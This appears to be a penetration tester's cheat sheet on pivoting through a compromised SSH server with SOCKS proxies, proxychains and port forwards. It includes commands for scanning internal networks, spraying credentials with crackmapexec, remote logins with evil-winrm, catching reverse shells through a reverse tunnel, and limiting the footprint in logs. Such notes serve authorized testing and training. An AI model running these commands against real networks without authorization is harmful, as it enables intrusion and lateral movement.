# SSH Pivoting

tags: #Pivoting #SSH #Lateral_Movement #Linux #Foundational

resources: [HackTricks SSH Tunneling](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#ssh)

> [!info] SSH tunneling allows you to pivot through a compromised SSH server to access internal networks. This is an alternative to tools like Ligolo-ng and Chisel.

## Dynamic Port Forwarding (SOCKS Proxy)

### Creating SOCKS Proxy

```bash
ssh <Username>@<TargetIP> -D 9050
```

> [!info] Creates a SOCKS proxy on local port 9050. All traffic sent through this port will be tunneled through the SSH connection.

### With SSH Key

```bash
ssh <Username>@<TargetIP> -i id_rsa -D 9050
```

### Background Process

```bash
ssh <Username>@<TargetIP> -D 9050 -f -N
```

> [!tip] `-f` runs SSH in background, `-N` prevents command execution (just tunneling).

## Configuring ProxyChains

### Edit ProxyChains Configuration

```bash
sudo nano /etc/proxychains4.conf
```

### Configuration Settings

```plaintext
# Enable quiet mode (less output)
quiet_mode

# Comment out proxy_dns if having issues
#proxy_dns

# Add SOCKS proxy at the end
[ProxyList]
socks5 127.0.0.1 9050
```

> [!important] Make sure to comment out any other proxies in the [ProxyList] section.

## Using ProxyChains

### Basic Usage

```bash
proxychains4 <command>
```

### Common Examples

```bash
# Nmap scan through proxy
proxychains4 nmap -sT -Pn <InternalTarget>

# SMB enumeration
proxychains4 smbclient -L \\<InternalTarget>

# CrackMapExec
proxychains4 crackmapexec smb <InternalSubnet>/24

# Evil-WinRM
proxychains4 evil-winrm -i <InternalTarget> -u <User> -p <Pass>

# SSH to another internal host
proxychains4 ssh <User>@<InternalTarget>
```

> [!warning] Use `-sT` (TCP connect scan) with nmap through proxychains. SYN scans won't work through SOCKS.

## Local Port Forwarding

### Forward Remote Port to Local

```bash
ssh <Username>@<TargetIP> -L <LocalPort>:<DestinationHost>:<DestinationPort>
```

### Example: Forward Remote RDP

```bash
ssh user@10.10.10.5 -L 3389:192.168.1.100:3389
```

> [!info] Now you can connect to `localhost:3389` and it will forward to `192.168.1.100:3389` through the SSH tunnel.

### Access Forwarded Port

```bash
xfreerdp3 /u:<Username> /p:'<Password>' /v:localhost:3389
```

### Multiple Port Forwards

```bash
ssh user@10.10.10.5 -L 3389:192.168.1.100:3389 -L 445:192.168.1.100:445 -L 5985:192.168.1.100:5985
```

## Remote Port Forwarding

### Forward Local Port to Remote

```bash
ssh <Username>@<TargetIP> -R <RemotePort>:localhost:<LocalPort>
```

### Example: Expose Local Web Server

```bash
ssh user@10.10.10.5 -R 8080:localhost:80
```

> [!info] The remote machine can now access your local web server on port 80 by connecting to its own port 8080.

### Reverse Shell Catcher

```bash
# On attacker machine
nc -lvnp 4444

# SSH reverse tunnel
ssh user@10.10.10.5 -R 4444:localhost:4444
```

> [!tip] Useful when the target can't directly connect back to you but you have SSH access.

## Complete Pivoting Workflow

### Step 1: Establish SSH Tunnel

```bash
ssh adminuser@10.10.155.5 -i id_rsa -D 9050 -f -N
```

### Step 2: Configure ProxyChains

```bash
sudo nano /etc/proxychains4.conf
```

```plaintext
quiet_mode
[ProxyList]
socks5 127.0.0.1 9050
```

### Step 3: Enumerate Internal Network

```bash
# Discover hosts
proxychains4 nmap -sT -Pn 192.168.1.0/24 -p 445,3389,5985

# SMB enumeration
proxychains4 crackmapexec smb 192.168.1.0/24 -u <User> -p <Pass>

# Check for admin access
proxychains4 crackmapexec smb 192.168.1.0/24 -u <User> -p <Pass> --shares
```

### Step 4: Access Internal Services

```bash
# WinRM access
proxychains4 evil-winrm -i 192.168.1.100 -u <User> -p <Pass>

# SMB access
proxychains4 smbclient //192.168.1.100/C$ -U <User>

# RDP (with local port forward)
ssh adminuser@10.10.155.5 -i id_rsa -L 3389:192.168.1.100:3389
xfreerdp3 /u:<User> /p:'<Pass>' /v:localhost:3389
```

## Advanced Techniques

### Jump Host Chaining

```bash
# First hop
ssh user1@10.10.10.5 -D 9050 -f -N

# Second hop through first
proxychains4 ssh user2@192.168.1.100 -D 9051 -f -N
```

> [!info] Now configure proxychains to use port 9051 for the second network segment.

### SSH Config for Easy Pivoting

```bash
nano ~/.ssh/config
```

```plaintext
Host pivot
    HostName 10.10.10.5
    User adminuser
    IdentityFile ~/.ssh/id_rsa
    DynamicForward 9050
    
Host internal
    HostName 192.168.1.100
    User administrator
    ProxyJump pivot
```

```bash
# Connect directly to internal host
ssh internal
```

## Troubleshooting

### Connection Timeout

> [!warning] Ensure the SSH server allows port forwarding.

```bash
# Check SSH server config
cat /etc/ssh/sshd_config | grep -i allowtcpforwarding
```

> [!tip] Should be set to `AllowTcpForwarding yes`

### ProxyChains DNS Issues

```bash
# Comment out proxy_dns in proxychains config
sudo nano /etc/proxychains4.conf
```

```plaintext
#proxy_dns
```

### Nmap Not Working

> [!important] Always use `-sT` (TCP connect) scan with proxychains. SYN scans require raw sockets which don't work through SOCKS.

```bash
proxychains4 nmap -sT -Pn <Target>
```

### Check Active SSH Tunnels

```bash
# List SSH processes
ps aux | grep ssh

# Check listening ports
ss -tulpn | grep ssh
netstat -tulpn | grep ssh
```

### Kill Background SSH Tunnel

```bash
# Find process
ps aux | grep "ssh.*9050"

# Kill by PID
kill <PID>

# Or kill all SSH tunnels
pkill -f "ssh.*-D"
```

## Comparison with Other Pivoting Tools

| Tool | Pros | Cons |
|------|------|------|
| **SSH Tunneling** | Built-in, no upload needed, stable | Requires SSH access, slower |
| **Ligolo-ng** | Fast, easy to use, no config | Requires binary upload |
| **Chisel** | Fast, SOCKS5 support | Requires binary upload |
| **Metasploit** | Integrated with framework | Heavy, easily detected |

> [!tip] Use SSH tunneling when you already have SSH access and want to avoid uploading tools.

## Security Considerations

> [!warning] SSH tunneling creates logs on the target system:
> - `/var/log/auth.log` (Debian/Ubuntu)
> - `/var/log/secure` (RHEL/CentOS)
> - `~/.ssh/authorized_keys` access logs

### Minimize Footprint

```bash
# Use compression to reduce traffic
ssh user@target -D 9050 -C

# Disable strict host key checking (testing only)
ssh user@target -D 9050 -o StrictHostKeyChecking=no
```
